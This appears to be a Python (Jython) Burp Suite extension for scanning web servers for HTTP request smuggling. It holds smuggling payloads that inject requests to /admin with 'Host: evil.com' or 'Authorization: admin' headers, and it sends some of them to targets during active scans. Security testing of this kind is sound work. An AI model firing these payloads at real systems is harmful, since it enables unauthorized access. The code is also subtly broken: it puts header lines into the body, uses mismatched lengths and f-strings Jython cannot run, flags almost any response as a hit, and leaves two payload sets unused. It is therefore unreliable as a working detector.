#!/usr/bin/env python3
"""
HTTP Request Smuggling BCheck for Burp Suite
Detects CL.TE, TE.CL, TE.TE, and other request smuggling vulnerabilities
"""

from burp import IBurpExtender
from burp import IScannerCheck
from burp import IScanIssue
from java.net import URL
import re

class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        
        # Set extension name
        callbacks.setExtensionName("Request Smuggling BCheck")
        
        # Register scanner check
        callbacks.registerScannerCheck(RequestSmugglingCheck(callbacks, self._helpers))

class RequestSmugglingCheck(IScannerCheck):
    def __init__(self, callbacks, helpers):
        self._callbacks = callbacks
        self._helpers = helpers
        self._issue_name = "HTTP Request Smuggling"
        
        # Request smuggling payloads
        self.smuggling_payloads = {
            'cl_te': [
                "Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
                "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nXX",
                "Content-Length: 8\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nXXXX",
                "Content-Length: 35\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com"
            ],
            'te_cl': [
                "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nX",
                "Transfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nXX",
                "Transfer-Encoding: chunked\r\nContent-Length: 8\r\n\r\n0\r\n\r\nXXXX",
                "Transfer-Encoding: chunked\r\nContent-Length: 50\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nAuthorization: admin"
            ],
            'te_te': [
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nX",
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: gzip\r\n\r\n0\r\n\r\nX",
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: deflate\r\n\r\n0\r\n\r\nX",
                "Transfer-Encoding: chunked\r\nTransfer-Encoding: compress\r\n\r\n0\r\n\r\nX"
            ],
            'header_injection': [
                "Content-Length: 35\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com",
                "Content-Length: 40\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: evil.com",
                "Content-Length: 45\r\n\r\n0\r\n\r\nPUT /admin HTTP/1.1\r\nHost: evil.com",
                "Content-Length: 50\r\n\r\n0\r\n\r\nDELETE /admin HTTP/1.1\r\nHost: evil.com"
            ],
            'auth_bypass': [
                "Content-Length: 50\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nAuthorization: admin",
                "Content-Length: 55\r\n\r\n0\r\n\r\nPOST /admin HTTP/1.1\r\nAuthorization: admin",
                "Content-Length: 60\r\n\r\n0\r\n\r\nPUT /admin HTTP/1.1\r\nAuthorization: admin",
                "Content-Length: 65\r\n\r\n0\r\n\r\nDELETE /admin HTTP/1.1\r\nAuthorization: admin"
            ]
        }
        
        # Detection patterns for smuggling indicators
        self.smuggling_indicators = [
            r"HTTP/1\.1 200 OK",
            r"HTTP/1\.1 302 Found",
            r"HTTP/1\.1 404 Not Found",
            r"HTTP/1\.1 500 Internal Server Error",
            r"admin",
            r"unauthorized",
            r"forbidden",
            r"access denied"
        ]
        
        # Compile regex patterns
        self.smuggling_regex = [re.compile(pattern, re.IGNORECASE) for pattern in self.smuggling_indicators]

    def doPassiveScan(self, baseRequestResponse):
        """Passive scanning for request smuggling indicators"""
        issues = []
        
        # Check for suspicious headers that might indicate smuggling
        request = baseRequestResponse.getRequest()
        request_str = self._helpers.bytesToString(request)
        
        # Look for conflicting headers
        if "Content-Length:" in request_str and "Transfer-Encoding:" in request_str:
            issues.append(RequestSmugglingIssue(
                baseRequestResponse.getHttpService(),
                self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                [baseRequestResponse],
                "Potential Request Smuggling - Conflicting Headers",
                "Found both Content-Length and Transfer-Encoding headers which may indicate request smuggling",
                "Medium",
                "Low"
            ))
        
        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Active scanning for request smuggling vulnerabilities"""
        issues = []
        
        # Test CL.TE smuggling
        for payload in self.smuggling_payloads['cl_te']:
            modified_request = self._helpers.buildHttpMessage(
                self._helpers.analyzeRequest(baseRequestResponse).getHeaders(),
                payload.encode('utf-8')
            )
            
            check_request_response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                modified_request
            )
            
            if check_request_response:
                response = check_request_response.getResponse()
                response_str = self._helpers.bytesToString(response)
                
                # Check for smuggling indicators
                for pattern in self.smuggling_regex:
                    if pattern.search(response_str):
                        issues.append(RequestSmugglingIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [baseRequestResponse, check_request_response],
                            "CL.TE Request Smuggling",
                            f"CL.TE request smuggling vulnerability detected with payload: {payload[:50]}...",
                            "High",
                            "Medium"
                        ))
                        break
        
        # Test TE.CL smuggling
        for payload in self.smuggling_payloads['te_cl']:
            modified_request = self._helpers.buildHttpMessage(
                self._helpers.analyzeRequest(baseRequestResponse).getHeaders(),
                payload.encode('utf-8')
            )
            
            check_request_response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                modified_request
            )
            
            if check_request_response:
                response = check_request_response.getResponse()
                response_str = self._helpers.bytesToString(response)
                
                # Check for smuggling indicators
                for pattern in self.smuggling_regex:
                    if pattern.search(response_str):
                        issues.append(RequestSmugglingIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [baseRequestResponse, check_request_response],
                            "TE.CL Request Smuggling",
                            f"TE.CL request smuggling vulnerability detected with payload: {payload[:50]}...",
                            "High",
                            "Medium"
                        ))
                        break
        
        # Test TE.TE smuggling
        for payload in self.smuggling_payloads['te_te']:
            modified_request = self._helpers.buildHttpMessage(
                self._helpers.analyzeRequest(baseRequestResponse).getHeaders(),
                payload.encode('utf-8')
            )
            
            check_request_response = self._callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(),
                modified_request
            )
            
            if check_request_response:
                response = check_request_response.getResponse()
                response_str = self._helpers.bytesToString(response)
                
                # Check for smuggling indicators
                for pattern in self.smuggling_regex:
                    if pattern.search(response_str):
                        issues.append(RequestSmugglingIssue(
                            baseRequestResponse.getHttpService(),
                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                            [baseRequestResponse, check_request_response],
                            "TE.TE Request Smuggling",
                            f"TE.TE request smuggling vulnerability detected with payload: {payload[:50]}...",
                            "High",
                            "Medium"
                        ))
                        break
        
        return issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        """Consolidate duplicate issues"""
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        else:
            return 0

class RequestSmugglingIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, severity, confidence):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail
        self._severity = severity
        self._confidence = confidence

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self._severity

    def getConfidence(self):
        return self._confidence

    def getIssueBackground(self):
        return "HTTP Request Smuggling is a technique where an attacker sends a request that gets interpreted differently by the front-end and back-end servers, potentially allowing unauthorized access to resources."

    def getRemediationBackground(self):
        return "To prevent request smuggling, ensure consistent HTTP parsing between front-end and back-end servers, validate and sanitize all headers, and use HTTPS."

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return "Implement proper HTTP header validation, use consistent HTTP parsing libraries, and consider using HTTP/2 which prevents most smuggling attacks."

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
